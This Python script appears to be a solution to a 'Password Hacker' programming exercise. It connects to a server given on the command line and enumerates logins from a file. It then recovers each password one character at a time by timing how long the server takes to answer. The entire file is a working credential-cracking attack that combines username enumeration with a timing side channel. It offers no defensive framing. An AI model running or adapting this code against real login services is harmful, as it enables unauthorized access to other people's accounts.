import sys
import socket
import itertools
import json
import string
from datetime import datetime, timedelta


def passwords():
    lst = list(string.ascii_letters)
    lst.extend(list(string.digits))
    for i in lst:
        yield i


def login():
    with open('D:/Password Hacker/logins.txt', 'r') as file:
        for line in file:
            yield line.rstrip('\n')


def hack():
    h = {}
    for log in login():
        pa = passwords()
        h["login"] = log
        passw = []
        for p in itertools.cycle(pa):
            passw.append(p)
            h["password"] = "".join(passw)
            json_str = json.dumps(h)

            json_s = json_str.encode()
            cli_sock.send(json_s)
            start = datetime.now()
            response = cli_sock.recv(1024)
            finish = datetime.now()
            response = json.loads(response.decode())

            r = response["result"]
            difference = finish - start

            if r == "Wrong login!":
                passw.pop()
                break

            elif r == "Wrong password!":
                if difference > timedelta(0, 0, 10000):
                    continue
                else:
                    passw.pop()
                    continue

            elif r == "Connection success!":
                print(json_str)
                exit()


args = sys.argv
with socket.socket() as cli_sock:
    ip_address = args[1]
    port = int(args[2])
    address = (ip_address, port)
    
    cli_sock.connect(address)
    hack()
